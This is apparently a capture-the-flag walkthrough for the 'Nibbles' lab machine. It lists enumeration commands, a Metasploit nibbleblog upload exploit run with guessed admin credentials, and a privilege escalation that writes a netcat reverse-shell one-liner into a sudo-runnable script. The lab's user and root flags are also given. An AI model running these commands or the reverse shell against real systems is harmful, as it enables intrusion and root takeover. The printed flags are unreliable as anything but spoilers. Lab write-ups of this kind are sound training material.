# Nibbles - Easy

```shell
nmap -T4 -p- -A -v 10.10.10.75

feroxbuster -u http://10.10.10.75/nibbleblog -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

searchsploit nibbleblog
#we have exploits

msfconsole -q

search nibbleblog

use exploit/multi/http/nibbleblog_file_upload

set LHOST 10.10.14.5

set USERNAME admin

set PASSWORD nibbles

set RHOSTS 10.10.10.75

set TARGETURI /nibbleblog

run

shell
#get system shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

whoami
#nibbler

cd /home/nibbler
#read user flag

sudo -l
#we can run monitor.sh in home directory
#we do not have the directories required

ls -la

unzip personal.zip

cd personal

cd stuff

ls -la
#monitor.sh

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 5555 >/tmp/f" > monitor.sh

#on attacker machine
nc -nvlp 5555

#on victim shell
sudo ./monitor.sh
#we get root shell on our listener
```

* Open ports & services:

  * 22 - OpenSSH 7.2p2 (Ubuntu)
  * 80 - http - Apache httpd 2.4.18

* The webpage on port 80 does not contain anything significant, but the page source mentions the directory /nibbleblog

* This directory contains a blogpage, we can check for clues here; ```feroxbuster``` can help in directory enumeration.

* We have a directory /nibbleblog/admin, containing several folders.

* We also find a directory /nibbleblog/content, containing /private, /public and /temp directories.

* We also have a login page at /nibbleblog/admin.php - we can attempt to use default creds here.

* admin:admin does not work, but admin:nibbles works and we get access.

* We can also search for exploits related to 'nibbleblog' and we get a few results.

* Using ```Metasploit```, we can configure and run the exploit - we get a Meterpreter shell as nibbles.

* We can run ```linpeas.sh``` to get clues for privesc.

* We can see that 'sudo -l' shows we can run a script 'monitor.sh' in nibble's home directory.

* Now the folder /personal is not there yet; we do have a .zip file with the same name and directory structure - so we can unzip it.

* Now, we can edit the script - we add a reverse shell one-liner - and setup listener on attacker machine.

* Running the script as sudo gives us root shell on our listener.

```markdown
1. User flag - ae1ea55b5c44f09d0f736dee2de65a12

2. Root flag - a5e9e5557a95a04f2b43a75b38b2c775
```
